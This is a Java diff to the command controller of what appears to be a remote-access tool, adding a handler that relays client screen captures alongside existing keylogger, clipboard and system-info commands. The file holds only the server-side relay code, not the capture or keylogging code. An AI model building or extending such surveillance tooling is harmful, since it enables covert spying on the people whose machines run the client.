@@ -3,16 +3,20 @@ package controllers;
 import models.ClientSocketModel;
 import models.MessageModel;
 import models.SocketModel;
-import models.SystemInfoModel;
+import org.json.JSONArray;
+import org.json.JSONObject;
 import server.Server;
 import utils.JSON;
 import utils.console;
 
+import java.io.ByteArrayOutputStream;
+import java.io.IOException;
+import java.nio.ByteBuffer;
 import java.util.HashMap;
 import java.util.Map;
 
 import static utils.Command.*;
-import static utils.Command.COMMAND_MONITORING;
+import static utils.Command.COMMAND_CLIENT_SCREEN;
 import static utils.Environment.*;
 
 public class Controller {
@@ -26,6 +30,36 @@ public class Controller {
         put(COMMAND_CLIENT_SYSTEM_INFO, Controller::getClientSystemInfo);
         put(COMMAND_CLIPBOARD, Controller::getClipboard);
         put(COMMAND_KEYLOGGER, Controller::getKeylogger);
+        put(COMMAND_CLIENT_SCREEN, Controller::getScreen);
+    }
+
+    private static void getScreen(JSON json, SocketModel model) {
+        if (json.get("uuid").equals(Server.getHost().getUUID())) {
+            String temp = new MessageModel(DEFAULT_SERVER_HOST, json.get("to"), COMMAND_CLIENT_SCREEN).json();
+            ClientSocketModel client = Server.getClientConnections().get(json.get("to"));
+            if (client != null) {
+                client.onSend(temp);
+                return;
+            }
+            model.onSend(new MessageModel(DEFAULT_SERVER_HOST, model.getUUID(), COMMAND_SYNC).put("clients", Server.getClientConnections().values()).json());
+            return;
+        }
+//        JSONArray tmp = new JSONArray(json.get("image"));
+//        int length = tmp.length();
+//        console.log(length + "");
+//
+//        byte[] arr = new byte[length];
+//        for (int i = 0; i < length; i++) {
+//            System.out.println(Byte.valueOf(tmp.get(i).toString()));
+//            arr[0] = Byte.parseByte(tmp.get(i).toString());
+//        }
+//        ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream();
+//        try {
+//            byteArrayOutputStream.write(arr);
+//        } catch (IOException e) {
+//            throw new RuntimeException(e);
+//        }
+        Server.getHost().onSend(json.toString());
     }
 
     private static void getKeylogger(JSON json, SocketModel model) {
@@ -49,7 +83,12 @@ public class Controller {
     private static void getMonitoring(JSON json, SocketModel model) {
         if (json.get("uuid").equals(Server.getHost().getUUID())) {
             String temp = new MessageModel(DEFAULT_SERVER_HOST, json.get("to"), COMMAND_MONITORING).json();
-            Server.getClientConnections().get(json.get("to")).onSend(temp);
+            ClientSocketModel client = Server.getClientConnections().get(json.get("to"));
+            if (client != null) {
+                client.onSend(temp);
+                return;
+            }
+            model.onSend(new MessageModel(DEFAULT_SERVER_HOST, model.getUUID(), COMMAND_SYNC).put("clients", Server.getClientConnections().values()).json());
             return;
         }
 
